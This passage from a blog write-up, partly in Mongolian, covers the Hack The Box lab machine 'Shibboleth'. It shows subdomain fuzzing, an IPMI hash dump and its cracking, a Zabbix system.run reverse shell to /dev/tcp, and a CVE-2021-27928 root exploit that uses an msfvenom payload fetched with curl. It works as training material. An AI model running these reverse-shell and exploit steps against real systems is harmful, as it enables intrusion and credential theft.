</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>       v1.3.1
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> :: Method           : GET
</span></span><span style=display:flex><span> :: URL              : http://shibboleth.htb
</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span style=display:flex><span> :: Header           : Host: FUZZ.shibboleth.htb
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span> :: Threads          : <span style=color:#ae81ff>40</span>
</span></span><span style=display:flex><span> :: Matcher          : Response status: <span style=color:#ae81ff>200</span>
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>monitor                 <span style=color:#f92672>[</span>Status: 200, Size: 3686, Words: 192, Lines: 30<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>monitoring              <span style=color:#f92672>[</span>Status: 200, Size: 3686, Words: 192, Lines: 30<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>zabbix                  <span style=color:#f92672>[</span>Status: 200, Size: 3686, Words: 192, Lines: 30<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>:: Progress: <span style=color:#f92672>[</span>4989/4989<span style=color:#f92672>]</span> :: Job <span style=color:#f92672>[</span>1/1<span style=color:#f92672>]</span> :: <span style=color:#ae81ff>169</span> req/sec :: Duration: <span style=color:#f92672>[</span>0:00:32<span style=color:#f92672>]</span> :: Errors: <span style=color:#ae81ff>0</span> ::
</span></span></code></pre></div><p>Нэмэх: <code>monitor.shibboleth.htb</code> <code>monitoring.shibboleth.htb</code> <code>zabbix.shibboleth.htb</code> -> <code>/etc/hosts</code></p><p>nmap дахин уншуулах:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -sS -A -sC -sV -Pn -sU --min-rate <span style=color:#ae81ff>5000</span> 10.10.11.124
</span></span></code></pre></div><p>удаад байна</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -sU -sV -sC shibboleth.htb -T4
</span></span></code></pre></div><p>удаад байна</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -sU -sV -sC 10.10.11.124 --min-rate <span style=color:#ae81ff>7500</span> -F
</span></span></code></pre></div><h3 id=6-user-datagram-protocol-udp>6. User Datagram Protocol (UDP)<a hidden class=anchor aria-hidden=true href=#6-user-datagram-protocol-udp>#</a></h3><p>User Datagram Protocol (UDP) is a communications <a href=https://www.techtarget.com/searchnetworking/definition/protocol>protocol</a> that is primarily used to establish low-latency and loss-tolerating connections between applications on the internet.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> shibboleth.htb <span style=color:#f92672>(</span>10.10.11.124<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.24s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>93</span> open|filtered ports
</span></span><span style=display:flex><span>PORT      STATE  SERVICE     VERSION
</span></span><span style=display:flex><span>520/udp   closed route
</span></span><span style=display:flex><span>623/udp   open   asf-rmcp
</span></span><span style=display:flex><span>999/udp   closed applix
</span></span><span style=display:flex><span>1433/udp  closed ms-sql-s
</span></span><span style=display:flex><span>1645/udp  closed radius
</span></span><span style=display:flex><span>31337/udp closed BackOrifice
</span></span><span style=display:flex><span>49152/udp closed unknown
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style=display:flex><span>SF-Port623-UDP:V<span style=color:#f92672>=</span>7.91%I<span style=color:#f92672>=</span>7%D<span style=color:#f92672>=</span>2/25%Time<span style=color:#f92672>=</span>62187E64%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu%r<span style=color:#f92672>(</span>ipm
</span></span><span style=display:flex><span>SF:i-rmcp,1E,<span style=color:#e6db74>&#34;\x06\0\xff\x07\0\0\0\0\0\0\0\0\0\x10\x81\x1cc\x20\x008\0\x01
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x97\x04\x03\0\0\0\0\t&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 603.57 seconds
</span></span></code></pre></div><p><code>623/udp open asf-rmcp</code></p><h3 id=7-metasploit>7. Metasploit<a hidden class=anchor aria-hidden=true href=#7-metasploit>#</a></h3><p><code>623/udp open asf-rmcp</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo msfdb run
</span></span><span style=display:flex><span>use auxiliary/scanner/ipmi/ipmi_version
</span></span><span style=display:flex><span><span style=color:#75715e>###</span>
</span></span><span style=display:flex><span>show options
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Module options <span style=color:#f92672>(</span>auxiliary/scanner/ipmi/ipmi_version<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name       Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----       ---------------  --------  -----------
</span></span><span style=display:flex><span>   BATCHSIZE  <span style=color:#ae81ff>256</span>              yes       The number of hosts to probe in each set
</span></span><span style=display:flex><span>   RHOSTS                      yes       The target host<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-M
</span></span><span style=display:flex><span>                                         etasploit
</span></span><span style=display:flex><span>   RPORT      <span style=color:#ae81ff>623</span>              yes       The target port <span style=color:#f92672>(</span>UDP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   THREADS    <span style=color:#ae81ff>10</span>               yes       The number of concurrent threads
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>set RHOSTS 10.10.11.124
</span></span><span style=display:flex><span>run
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending IPMI requests to 10.10.11.124-&gt;10.10.11.124 <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> hosts<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth<span style=color:#f92672>(</span>auth_msg, auth_user, non_null_user<span style=color:#f92672>)</span> PassAuth<span style=color:#f92672>(</span>password, md5, md2, null<span style=color:#f92672>)</span> Level<span style=color:#f92672>(</span>1.5, 2.0<span style=color:#f92672>)</span> 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Scanned <span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> hosts <span style=color:#f92672>(</span>100% complete<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Auxiliary module execution completed
</span></span></code></pre></div><p><code>IPMI - IPMI-2.0</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>use auxiliary/scanner/ipmi/ipmi_dumphashes
</span></span><span style=display:flex><span>set RHOSTS 10.10.11.124
</span></span><span style=display:flex><span>run
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.11.124:623 - IPMI - Hash found: Administrator:62dd821c020200005e2e318787cfa1ad1422a79bec99e956a44d8b6fe005174bef1e83cc051b474da123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9c69d04f7d723e389b00bfd89e6ae99276fb99c6
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Scanned <span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> hosts <span style=color:#f92672>(</span>100% complete<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Auxiliary module execution completed
</span></span></code></pre></div><p><code>Administrator</code></p><p>Hashcat</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>vi hash
</span></span><span style=display:flex><span><span style=color:#75715e>## add</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 62dd821c020200005e2e318787cfa1ad1422a79bec99e956a44d8b6fe005174bef1e83cc051b474da123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9c69d04f7d723e389b00bfd89e6ae99276fb99c6</span>
</span></span><span style=display:flex><span>hashcat -m <span style=color:#ae81ff>7300</span> hash /usr/share/wordlists/rockyou.txt
</span></span></code></pre></div><p>7300 | IMPI2 RAKP HMAC-SHA1 | Network Protocol</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Dictionary cache built:
</span></span><span style=display:flex><span>* Filename..: /usr/share/wordlists/rockyou.txt
</span></span><span style=display:flex><span>* Passwords.: <span style=color:#ae81ff>14344392</span>
</span></span><span style=display:flex><span>* Bytes.....: <span style=color:#ae81ff>139921507</span>
</span></span><span style=display:flex><span>* Keyspace..: <span style=color:#ae81ff>14344385</span>
</span></span><span style=display:flex><span>* Runtime...: <span style=color:#ae81ff>4</span> secs
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>62dd821c020200005e2e318787cfa1ad1422a79bec99e956a44d8b6fe005174bef1e83cc051b474da123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9c69d04f7d723e389b00bfd89e6ae99276fb99c6:ilovepumkinpie1
</span></span><span style=display:flex><span>                                                 
</span></span><span style=display:flex><span>Session..........: hashcat
</span></span><span style=display:flex><span>Status...........: Cracked
</span></span><span style=display:flex><span>Hash.Name........: IPMI2 RAKP HMAC-SHA1
</span></span><span style=display:flex><span>Hash.Target......: 62dd821c020200005e2e318787cfa1ad1422a79bec99e956a44...fb99c6
</span></span><span style=display:flex><span>Time.Started.....: Fri Feb <span style=color:#ae81ff>25</span> 02:34:11 <span style=color:#ae81ff>2022</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>10</span> secs<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Time.Estimated...: Fri Feb <span style=color:#ae81ff>25</span> 02:34:21 <span style=color:#ae81ff>2022</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>0</span> secs<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Guess.Base.......: File <span style=color:#f92672>(</span>/usr/share/wordlists/rockyou.txt<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Guess.Queue......: 1/1 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Speed.#1.........:   835.7 kH/s <span style=color:#f92672>(</span>0.99ms<span style=color:#f92672>)</span> @ Accel:1024 Loops:1 Thr:1 Vec:8
</span></span><span style=display:flex><span>Recovered........: 1/1 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span> Digests
</span></span><span style=display:flex><span>Progress.........: 7395328/14344385 <span style=color:#f92672>(</span>51.56%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Rejected.........: 0/7395328 <span style=color:#f92672>(</span>0.00%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Restore.Point....: 7394304/14344385 <span style=color:#f92672>(</span>51.55%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
</span></span><span style=display:flex><span>Candidates.#1....: ilovequay -&gt; ilovepaul0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Started: Fri Feb <span style=color:#ae81ff>25</span> 02:33:35 <span style=color:#ae81ff>2022</span>
</span></span><span style=display:flex><span>Stopped: Fri Feb <span style=color:#ae81ff>25</span> 02:34:22 <span style=color:#ae81ff>2022</span>
</span></span></code></pre></div><p><code>Administrator</code>
<code>ilovepumkinpie1</code></p><h3 id=8-exploitation>8. Exploitation<a hidden class=anchor aria-hidden=true href=#8-exploitation>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc -lvnp <span style=color:#ae81ff>9001</span>
</span></span></code></pre></div><figure><img loading=lazy src=/images/shib_post_image_1.png></figure><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>system.run<span style=color:#f92672>[</span>/bin/bash -c <span style=color:#e6db74>&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.66/9001 0&gt;&amp;1&#34;</span>,nowait<span style=color:#f92672>]</span>
</span></span></code></pre></div><h4 id=81-shell-balance>8.1 Shell balance<a hidden class=anchor aria-hidden=true href=#81-shell-balance>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span></code></pre></div><p>ctrl+z</p><pre tabindex=0><code>stty raw -echo
</code></pre><p><code>f+g [enter enter]</code>
буцаад nc орлоо</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>export TERM<span style=color:#f92672>=</span>xterm
</span></span></code></pre></div><h4 id=82-usertxt>8.2 User.txt<a hidden class=anchor aria-hidden=true href=#82-usertxt>#</a></h4><p>id</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>uid<span style=color:#f92672>=</span>110<span style=color:#f92672>(</span>zabbix<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>118<span style=color:#f92672>(</span>zabbix<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>118<span style=color:#f92672>(</span>zabbix
</span></span></code></pre></div><p>passwd</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style=display:flex><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
</span></span><span style=display:flex><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
</span></span><span style=display:flex><span>landscape:x:108:114::/var/lib/landscape:/usr/sbin/nologin
</span></span><span style=display:flex><span>pollinate:x:109:1::/var/cache/pollinate:/bin/false
</span></span><span style=display:flex><span>ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash
</span></span><span style=display:flex><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style=display:flex><span>zabbix:x:110:118::/var/lib/zabbix/:/usr/sbin/nologin
</span></span><span style=display:flex><span>Debian-snmp:x:111:119::/var/lib/snmp:/bin/false
</span></span><span style=display:flex><span>mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
</span></span></code></pre></div><p><code>ipmi-svc</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>su - ipmi-svc
</span></span><span style=display:flex><span>ilovepumkinpie1
</span></span><span style=display:flex><span><span style=color:#75715e>#id</span>
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>ipmi-svc<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>ipmi-svc<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>ipmi-svc<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>user.txt</p><pre tabindex=0><code>1bcfcca*******
</code></pre><h3 id=9-enumeration>9. Enumeration<a hidden class=anchor aria-hidden=true href=#9-enumeration>#</a></h3><p>linpeas</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tmp$ chmod +x linpeas.sh
</span></span><span style=display:flex><span>./linpeas.sh
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╔══════════╣ Readable files belonging to root and readable by me but not world readable                                       
</span></span><span style=display:flex><span>-rw-r----- <span style=color:#ae81ff>1</span> root ipmi-svc <span style=color:#ae81ff>22306</span> Oct <span style=color:#ae81ff>18</span> 09:24 /etc/zabbix/zabbix_server.conf.dpkg-dist                                        
</span></span><span style=display:flex><span>-rw-r----- <span style=color:#ae81ff>1</span> root ipmi-svc <span style=color:#ae81ff>21863</span> Apr <span style=color:#ae81ff>24</span>  <span style=color:#ae81ff>2021</span> /etc/zabbix/zabbix_server.conf
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>╔══════════╣ Analyzing Zabbix Files <span style=color:#f92672>(</span>limit 70<span style=color:#f92672>)</span>                                                                                
</span></span><span style=display:flex><span>-rw-r----- <span style=color:#ae81ff>1</span> root ipmi-svc <span style=color:#ae81ff>21863</span> Apr <span style=color:#ae81ff>24</span>  <span style=color:#ae81ff>2021</span> /etc/zabbix/zabbix_server.conf                                                  
</span></span><span style=display:flex><span>LogFile<span style=color:#f92672>=</span>/var/log/zabbix/zabbix_server.log                                                                                     
</span></span><span style=display:flex><span>LogFileSize<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>                                                                                                                 
</span></span><span style=display:flex><span>PidFile<span style=color:#f92672>=</span>/run/zabbix/zabbix_server.pid                                                                                         
</span></span><span style=display:flex><span>SocketDir<span style=color:#f92672>=</span>/run/zabbix                                                                                                         
</span></span><span style=display:flex><span>DBName<span style=color:#f92672>=</span>zabbix                                                                                                                 
</span></span><span style=display:flex><span>DBUser<span style=color:#f92672>=</span>zabbix                                                                                                                 
</span></span><span style=display:flex><span>DBPassword<span style=color:#f92672>=</span>bloooarskybluh
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mysql -D zabbix -u zabbix -p 
</span></span></code></pre></div><h4 id=91-cve-2021-27928>9.1 CVE-2021-27928<a hidden class=anchor aria-hidden=true href=#91-cve-2021-27928>#</a></h4><p>Local VM</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style=color:#f92672>=</span>10.10.14.66 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>9003</span> -f elf-so -o elf 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span style=display:flex><span>No encoder specified, outputting raw payload
</span></span><span style=display:flex><span>Payload size: <span style=color:#ae81ff>74</span> bytes
</span></span><span style=display:flex><span>Final size of elf-so file: <span style=color:#ae81ff>476</span> bytes
</span></span><span style=display:flex><span>Saved as: elf
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mv elf www
</span></span><span style=display:flex><span>python3 http.server
</span></span><span style=display:flex><span><span style=color:#75715e># Machine VM</span>
</span></span><span style=display:flex><span>curl 10.10.14.66:9003/elf -o elf
</span></span><span style=display:flex><span><span style=color:#75715e># Local VM</span>
</span></span><span style=display:flex><span>nc -lvnp <span style=color:#ae81ff>9003</span>
</span></span></code></pre></div><p>mysql</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SET</span> <span style=color:#66d9ef>GLOBAL</span> wsrep_provider<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/tmp/elf&#34;</span>;
</span></span></code></pre></div><p>shell balance:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span></code></pre></div><p>root.txt</p><pre tabindex=0><code>9a41bd*********
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://cadil.github.io/tags/writeup/>Writeup</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://cadil.github.io/>CaDiL's Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="хуулах";function s(){t.innerHTML="хуулсан!",setTimeout(()=>{t.innerHTML="хуулах"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>